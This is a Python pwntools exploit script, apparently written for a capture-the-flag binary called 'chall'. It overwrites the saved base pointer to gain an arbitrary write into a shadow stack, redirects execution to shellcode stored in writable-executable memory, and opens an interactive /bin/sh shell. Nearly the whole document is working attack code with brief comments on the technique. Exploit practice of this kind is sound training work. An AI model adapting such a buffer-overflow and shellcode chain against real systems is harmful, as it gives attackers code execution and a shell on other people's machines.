import pwn

io = pwn.remote("localhost", 9000)

if pwn.args.GDB:
    # breakpoints:
    # 0x4001d4: vuln.leave
    # 0x400138: after notvuln.write
    # 0x400165: after notvuln.read
    pwn.gdb.attach(
        target="chall",  # Takes the youngest PID matching this name
        exe="./chall",
        gdbscript="""
break *0x4001d4
break *0x400138
break *0x400165
continue
    """,
    )

pwn.context.binary = elf = pwn.ELF("chall")
stack_shadow = elf.symbols["__stack_shadow"]
print(hex(stack_shadow))

"""
Exploit:
- Overwrite $rbp to set address for an arbitrary write
  - The address we'll use is `__stack_shadow`
- Overwrite return address in `__stack_shadow` to control $rip
- Jump into shellcode also stored on .bss, which is RWX
"""

# Part 1: Overwrite $rbp with to later write into `__stack_shadow` address

# RBP  0x636161706361616f ('oaacpaac')
offset = pwn.cyclic_find("oaac")
print(offset)

# lea rsi, [rbp-0x100]
# rbp - 0x100 = stack_shadow
# rbp = stack_shadow + 0x100

payload = b"A" * offset + pwn.p64(stack_shadow + 0x100)
io.sendlineafter("Data: ", payload)

# Part 2: Overwrite return address in `__stack_shadow` to jump into our
# shellcode

pwn.context.arch = "amd64"
binsh = pwn.asm(pwn.shellcraft.sh())
binsh_addr = pwn.p64(0x600244)

payload = b"B" * pwn.cyclic_find(0x61616163)
payload += binsh_addr + binsh
io.sendlineafter("Data: ", payload)
io.interactive()
